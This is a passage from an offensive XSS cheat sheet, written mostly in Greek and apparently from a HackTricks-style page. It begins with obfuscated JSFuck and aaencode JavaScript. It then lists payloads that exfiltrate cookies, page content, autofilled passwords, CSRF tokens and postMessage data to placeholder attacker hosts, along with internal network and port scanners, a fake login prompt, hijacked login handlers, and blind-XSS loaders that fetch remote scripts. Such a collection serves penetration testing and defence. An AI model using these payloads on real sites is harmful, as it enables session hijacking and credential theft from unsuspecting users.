(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()
</script>
```

```javascript
//aaencode
ﾟωﾟﾉ = /｀ｍ´）ﾉ ~┻━┻   / /*´∇｀*/["_"]
o = ﾟｰﾟ = _ = 3
c = ﾟΘﾟ = ﾟｰﾟ - ﾟｰﾟ
ﾟДﾟ = ﾟΘﾟ = (o ^ _ ^ o) / (o ^ _ ^ o)
ﾟДﾟ = {
ﾟΘﾟ: "_",
ﾟωﾟﾉ: ((ﾟωﾟﾉ == 3) + "_")[ﾟΘﾟ],
ﾟｰﾟﾉ: (ﾟωﾟﾉ + "_")[o ^ _ ^ (o - ﾟΘﾟ)],
ﾟДﾟﾉ: ((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ],
}
ﾟДﾟ[ﾟΘﾟ] = ((ﾟωﾟﾉ == 3) + "_")[c ^ _ ^ o]
ﾟДﾟ["c"] = (ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ - ﾟΘﾟ]
ﾟДﾟ["o"] = (ﾟДﾟ + "_")[ﾟΘﾟ]
ﾟoﾟ =
ﾟДﾟ["c"] +
ﾟДﾟ["o"] +
(ﾟωﾟﾉ + "_")[ﾟΘﾟ] +
((ﾟωﾟﾉ == 3) + "_")[ﾟｰﾟ] +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ - ﾟΘﾟ] +
ﾟДﾟ["c"] +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
ﾟДﾟ["o"] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ]
ﾟДﾟ["_"] = (o ^ _ ^ o)[ﾟoﾟ][ﾟoﾟ]
ﾟεﾟ =
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
ﾟДﾟ.ﾟДﾟﾉ +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[o ^ _ ^ (o - ﾟΘﾟ)] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
(ﾟωﾟﾉ + "_")[ﾟΘﾟ]
ﾟｰﾟ += ﾟΘﾟ
ﾟДﾟ[ﾟεﾟ] = "\\"
ﾟДﾟ.ﾟΘﾟﾉ = (ﾟДﾟ + ﾟｰﾟ)[o ^ _ ^ (o - ﾟΘﾟ)]
oﾟｰﾟo = (ﾟωﾟﾉ + "_")[c ^ _ ^ o]
ﾟДﾟ[ﾟoﾟ] = '"'
ﾟДﾟ["_"](
ﾟДﾟ["_"](
ﾟεﾟ +
ﾟДﾟ[ﾟoﾟ] +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
(ﾟｰﾟ + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
(o ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(o ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟoﾟ]
)(ﾟΘﾟ)
)("_")
```

```javascript
// It's also possible to execute JS code only with the chars: []`+!${}
```
## XSS common payloads

### Πολλαπλά payloads σε 1


{{#ref}}
steal-info-js.md
{{#endref}}

### Iframe Παγίδα

Κάντε τον χρήστη να περιηγηθεί στη σελίδα χωρίς να βγει από το iframe και κλέψτε τις ενέργειές του (συμπεριλαμβανομένων των πληροφοριών που αποστέλλονται μέσω φορμών):


{{#ref}}
../iframe-traps.md
{{#endref}}

### Ανάκτηση Cookies
```javascript
<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
<img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie">
<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script>
<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script>
<script>location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.write('<img src="http://<YOUR_SERVER_IP>?c='+document.cookie+'" />')</script>
<script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['assign']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['href']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script>
<script>var i=new Image();i.src="http://<YOUR_SERVER_IP>/?c="+document.cookie</script>
<script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script>
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>
```
> [!TIP]
> **Δεν θα μπορείτε να έχετε πρόσβαση στα cookies από JavaScript** αν το flag HTTPOnly έχει οριστεί στο cookie. Αλλά εδώ έχετε [κάποιους τρόπους να παρακάμψετε αυτή την προστασία](../hacking-with-cookies/index.html#httponly) αν είστε αρκετά τυχεροί.

### Κλοπή περιεχομένου σελίδας
```javascript
var url = "http://10.10.10.25:8000/vac/a1fbf2d1-7c3f-48d2-b0c3-a205e54e09e8"
var attacker = "http://10.10.14.8/exfil"
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
if (xhr.readyState == XMLHttpRequest.DONE) {
fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
}
}
xhr.open("GET", url, true)
xhr.send(null)
```
### Εύρεση εσωτερικών διευθύνσεων IP
```html
<script>
var q = []
var collaboratorURL =
"http://5ntrut4mpce548i2yppn9jk1fsli97.burpcollaborator.net"
var wait = 2000
var n_threads = 51

// Prepare the fetchUrl functions to access all the possible
for (i = 1; i <= 255; i++) {
q.push(
(function (url) {
return function () {
fetchUrl(url, wait)
}
})("http://192.168.0." + i + ":8080")
)
}

// Launch n_threads threads that are going to be calling fetchUrl until there is no more functions in q
for (i = 1; i <= n_threads; i++) {
if (q.length) q.shift()()
}

function fetchUrl(url, wait) {
console.log(url)
var controller = new AbortController(),
signal = controller.signal
fetch(url, { signal })
.then((r) =>
r.text().then((text) => {
location =
collaboratorURL +
"?ip=" +
url.replace(/^http:\/\//, "") +
"&code=" +
encodeURIComponent(text) +
"&" +
Date.now()
})
)
.catch((e) => {
if (!String(e).includes("The user aborted a request") && q.length) {
q.shift()()
}
})

setTimeout((x) => {
controller.abort()
if (q.length) {
q.shift()()
}
}, wait)
}
</script>
```
### Port Scanner (fetch)
```javascript
const checkPort = (port) => { fetch(http://localhost:${port}, { mode: "no-cors" }).then(() => { let img = document.createElement("img"); img.src = http://attacker.com/ping?port=${port}; }); } for(let i=0; i<1000; i++) { checkPort(i); }
```
### Port Scanner (websockets)
```python
var ports = [80, 443, 445, 554, 3306, 3690, 1234];
for(var i=0; i<ports.length; i++) {
var s = new WebSocket("wss://192.168.1.1:" + ports[i]);
s.start = performance.now();
s.port = ports[i];
s.onerror = function() {
console.log("Port " + this.port + ": " + (performance.now() -this.start) + " ms");
};
s.onopen = function() {
console.log("Port " + this.port+ ": " + (performance.now() -this.start) + " ms");
};
}
```
_Σύντομοι χρόνοι υποδεικνύουν μια ανταποκρινόμενη θύρα_ _Μακρύτεροι χρόνοι υποδεικνύουν έλλειψη απάντησης._

Ελέγξτε τη λίστα των θυρών που απαγορεύονται στο Chrome [**here**](https://src.chromium.org/viewvc/chrome/trunk/src/net/base/net_util.cc) και στο Firefox [**here**](https://www-archive.mozilla.org/projects/netlib/portbanning#portlist).

### Πλαίσιο για αίτηση διαπιστευτηρίων
```html
<style>::placeholder { color:white; }</style><script>document.write("<div style='position:absolute;top:100px;left:250px;width:400px;background-color:white;height:230px;padding:15px;border-radius:10px;color:black'><form action='https://example.com/'><p>Your sesion has timed out, please login again:</p><input style='width:100%;' type='text' placeholder='Username' /><input style='width: 100%' type='password' placeholder='Password'/><input type='submit' value='Login'></form><p><i>This login box is presented using XSS as a proof-of-concept</i></p></div>")</script>
```
### Καταγραφή κωδικών από αυτόματη συμπλήρωση
```javascript
<b>Username:</><br>
<input name=username id=username>
<b>Password:</><br>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
Όταν εισάγονται δεδομένα στο πεδίο password, το username και το password αποστέλλονται στον attackers server — ακόμη και αν ο client επιλέξει ένα saved password και δεν γράψει τίποτα, τα credentials θα είναι ex-filtrated.

### Hijack form handlers to exfiltrate credentials (const shadowing)

If a critical handler (e.g., `function DoLogin(){...}`) is declared later in the page, and your payload runs earlier (e.g., via an inline JS-in-JS sink), define a `const` with the same name first to preempt and lock the handler. Later function declarations cannot rebind a `const` name, leaving your hook in control:
```javascript
const DoLogin = () => {
const pwd  = Trim(FormInput.InputPassword.value);
const user = Trim(FormInput.InputUtente.value);
fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));
};
```
Σημειώσεις
- Αυτό βασίζεται στη σειρά εκτέλεσης: η ένεσή σας πρέπει να εκτελεστεί πριν από τη νόμιμη δήλωση.
- Εάν το payload σας είναι τυλιγμένο σε `eval(...)`, οι δεσμεύσεις `const/let` δεν θα γίνουν παγκόσμιες μεταβλητές. Χρησιμοποιήστε την δυναμική ένεση `<script>` από την ενότητα “Deliverable payloads with eval(atob()) and scope nuances” για να διασφαλίσετε μια πραγματική παγκόσμια, μη επαναδεσμεύσιμη δεσμεύση.
- Όταν φίλτρα λέξεων-κλειδιών μπλοκάρουν κώδικα, συνδυάστε με Unicode-escaped identifiers ή παράδοση `eval(atob('...'))`, όπως φαίνεται παραπάνω.

### Keylogger

Απλώς ψάχνοντας στο github βρήκα μερικά διαφορετικά:

- [https://github.com/JohnHoder/Javascript-Keylogger](https://github.com/JohnHoder/Javascript-Keylogger)
- [https://github.com/rajeshmajumdar/keylogger](https://github.com/rajeshmajumdar/keylogger)
- [https://github.com/hakanonymos/JavascriptKeylogger](https://github.com/hakanonymos/JavascriptKeylogger)
- Μπορείτε επίσης να χρησιμοποιήσετε το metasploit `http_javascript_keylogger`

### Stealing CSRF tokens
```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
var changeReq = new XMLHttpRequest();
changeReq.open('post', '/email/change-email', true);
changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
### Κλοπή μηνυμάτων PostMessage
```html
<img src="https://attacker.com/?" id=message>
<script>
window.onmessage = function(e){
document.getElementById("message").src += "&"+e.data;
</script>
```
### PostMessage-origin script loaders (opener-gated)

Αν μια σελίδα **αποθηκεύει `event.origin` από ένα `postMessage` και αργότερα το συνενώνει σε ένα script URL**, ο αποστολέας ελέγχει το **origin** του φορτωμένου JS:
```javascript
window.addEventListener('message', (event) => {
if (event.data.msg_type === 'IWL_BOOTSTRAP') {
localStorage.setItem('CFG', {host: event.origin, pixelID: event.data.pixel_id});
startIWL(); // later loads `${host}/sdk/${pixelID}/iwl.js`
}
});
```
Συνταγή εκμετάλλευσης (from CAPIG):

- **Gates**: ενεργοποιείται μόνο όταν `window.opener` υπάρχει και `pixel_id` είναι allowlisted; **origin is never checked**.
- **Use CSP-allowed origin**: μεταπήδησε σε ένα domain που επιτρέπεται ήδη από τον victim CSP (π.χ., σε logged-out help pages που επιτρέπουν analytics όπως `*.THIRD-PARTY.com`) και φιλοξένησε `/sdk/<pixel_id>/iwl.js` εκεί μέσω takeover/XSS/upload.
- **Restore `opener`**: σε Android WebView, `window.name='x'; window.open(target,'x')` κάνει την σελίδα τον δικό της opener; στείλε το κακόβουλο `postMessage` από ένα hijacked iframe.
- **Trigger**: το iframe posts `{msg_type:'IWL_BOOTSTRAP', pixel_id:<allowed>}`; ο parent τότε φορτώνει attacker `iwl.js` από το CSP-allowed origin και το εκτελεί.

Αυτό μετατρέπει τον origin-less `postMessage` validation σε ένα **remote script loader primitive** που επιβιώνει του CSP αν μπορέσεις να προσγειωθείς σε οποιοδήποτε origin που ήδη επιτρέπεται από την policy.

### Supply-chain stored XSS via backend JS concatenation

Όταν ένα backend **builds a shared SDK by concatenating JS strings with user-controlled values**, οποιοσδήποτε quote/structure breaker μπορεί να εγχύσει script που σερβίρεται σε κάθε consumer:

- Example pattern (Meta CAPIG): ο server appends `cbq.config.set("<pixel>","IWLParameters",{params: <user JSON>});` απευθείας στο `capig-events.js`.
- Η εισαγωγή `'` ή `"]}` κλείνει το literal/object και προσθέτει attacker JS, δημιουργώντας **stored XSS** στο διανεμημένο SDK για κάθε site που το φορτώνει (first-party και third-party).

### Stored XSS in generated reports when escaping is disabled

Εάν τα uploaded files αναλύονται και τα metadata τους τυπώνονται σε HTML reports με το escaping απενεργοποιημένο (`|safe`, custom renderers), αυτά τα metadata αποτελούν **stored XSS sink**. Παράδειγμα ροής:
```python
xmlhost = data.getAttribute(f'{ns}:host')
ret_list.append(('dialer_code_found', (xmlhost,), ()))
'title': a_template['title'] % t_name  # %s fed by xmlhost
```
Ένα Django template αποδίδει `{{item|key:"title"|safe}}`, οπότε το attacker HTML εκτελείται.

**Exploit:** Τοποθετήστε **entity-encoded HTML** σε οποιοδήποτε manifest/config πεδίο που φτάνει στην αναφορά:
```xml
<data android:scheme="android_secret_code"
android:host="&lt;img src=x onerror=alert(document.domain)&gt;"/>
```
Αν αποδοθεί με `|safe`, η αναφορά εμφανίζει `<img ...>` και εκτελεί JS κατά την προβολή.

**Αναζήτηση:** αναζητήστε συνθέτες αναφορών/ειδοποιήσεων που επαναχρησιμοποιούν πεδία που έχουν αναλυθεί σε `%s`/f-strings και απενεργοποιούν το auto-escape. Ένα κωδικοποιημένο tag σε ένα ανεβασμένο manifest/log/archive διατηρεί το XSS ενεργό για κάθε θεατή.

### Κατάχρηση Service Workers


{{#ref}}
abusing-service-workers.md
{{#endref}}

### Πρόσβαση σε Shadow DOM


{{#ref}}
shadow-dom.md
{{#endref}}

### Polyglots


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss_polyglots.txt
{{#endref}}

### Blind XSS payloads

Μπορείτε επίσης να χρησιμοποιήσετε: [https://xsshunter.com/](https://xsshunter.com)
```html
"><img src='//domain/xss'>
"><script src="//domain/xss.js"></script>
><a href="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">Click Me For An Awesome Time</a>
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//0mnb1tlfl5x4u55yfb57dmwsajgd42.burpcollaborator.net/scriptb");a.send();</script>

<!-- html5sec - Self-executing focus event via autofocus: -->
"><input onfocus="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')" autofocus>

<!-- html5sec - JavaScript execution via iframe and onload -->
"><iframe onload="eval('d=document; _=d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')">

<!-- html5sec - SVG tags allow code to be executed with onload without any other elements. -->
"><svg onload="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')" xmlns="http://www.w3.org/2000/svg"></svg>

<!-- html5sec -  allow error handlers in <SOURCE> tags if encapsulated by a <VIDEO> tag. The same works for <AUDIO> tags  -->
"><video><source onerror="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!--  html5sec - eventhandler -  element fires an "onpageshow" event without user interaction on all modern browsers. This can be abused to bypass blacklists as the event is not very well known.  -->
"><body onpageshow="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!-- xsshunter.com - Sites that use JQuery -->
<script>$.getScript("//domain")</script>

<!-- xsshunter.com - When <script> is filtered -->
"><img src=x id=payload&#61;&#61; onerror=eval(atob(this.id))>

<!-- xsshunter.com - Bypassing poorly designed systems with autofocus -->
"><input onfocus=eval(atob(this.id)) id=payload&#61;&#61; autofocus>

<!-- noscript trick -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- whitelisted CDNs in CSP -->
"><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
<!-- ... add more CDNs, you'll get WARNING: Tried to load angular more than once if multiple load. but that does not matter you'll get a HTTP interaction/exfiltration :-]... -->
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>

<!-- Payloads from https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide -->
<!-- Image tag -->
'"><img src="x" onerror="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- Input tag with autofocus -->
'"><input autofocus onfocus="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- In case jQuery is loaded, we can make use of the getScript method -->
'"><script>$.getScript("{SERVER}/script.js")</script>

<!-- Make use of the JavaScript protocol (applicable in cases where your input lands into the "href" attribute or a specific DOM sink) -->
javascript:eval(atob("Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw=="))

<!-- Render an iframe to validate your injection point and receive a callback -->
'"><iframe src="{SERVER}"></iframe>

<!-- Bypass certain Content Security Policy (CSP) restrictions with a base tag -->
<base href="{SERVER}" />

<!-- Make use of the meta-tag to initiate a redirect -->
<meta http-equiv="refresh" content="0; url={SERVER}" />

<!-- In case your target makes use of AngularJS -->
{{constructor.constructor("import('{SERVER}/script.js')")()}}
```
### Regex - Πρόσβαση σε Κρυφό Περιεχόμενο

Από [**this writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-piyosay) μπορεί να μάθει κανείς ότι ακόμα κι αν κάποιες τιμές εξαφανιστούν από το JS, εξακολουθεί να είναι δυνατό να τις βρει κανείς στα JS attributes σε διάφορα αντικείμενα. Για παράδειγμα, ένα input ενός REGEX μπορεί να βρεθεί ακόμα και μετά την αφαίρεση της τιμής του input του regex:
```javascript
// Do regex with flag
flag = "CTF{FLAG}"
re = /./g
re.test(flag)

// Remove flag value, nobody will be able to get it, right?
flag = ""

// Access previous regex input
console.log(RegExp.input)
console.log(RegExp.rightContext)
console.log(
document.all["0"]["ownerDocument"]["defaultView"]["RegExp"]["rightContext"]
)
```
### Brute-Force List


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss.txt
{{#endref}}

## XSS Abusing other vulnerabilities

### XSS in Markdown

Μπορείς να εισάγεις κώδικα Markdown που θα αποδοθεί; Ίσως να πετύχεις XSS! Δες:


{{#ref}}
xss-in-markdown.md
{{#endref}}

### XSS to SSRF

Έχεις XSS σε ένα **site that uses caching**; Δοκίμασε **upgrading that to SSRF** μέσω Edge Side Include Injection με αυτό το payload:
```python
<esi:include src="http://yoursite.com/capture" />
```
Use it to bypass cookie restrictions, XSS filters and much more!\
Περισσότερες πληροφορίες για αυτήν την τεχνική εδώ: [**XSLT**](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md).

### XSS σε δυναμικά δημιουργημένο PDF

Εάν μια ιστοσελίδα δημιουργεί ένα PDF χρησιμοποιώντας είσοδο που ελέγχεται από τον χρήστη, μπορείτε να προσπαθήσετε να **ξεγελάσετε το bot** που δημιουργεί το PDF ώστε να **εκτελέσει αυθαίρετο JS code**.\
Έτσι, αν ο **PDF creator bot finds** κάποιο είδος **HTML** **tags**, πρόκειται να τα **ερμηνεύσει**, και μπορείτε να **καταχραστείτε** αυτήν τη συμπεριφορά για να προκαλέσετε ένα **Server XSS**.


{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}

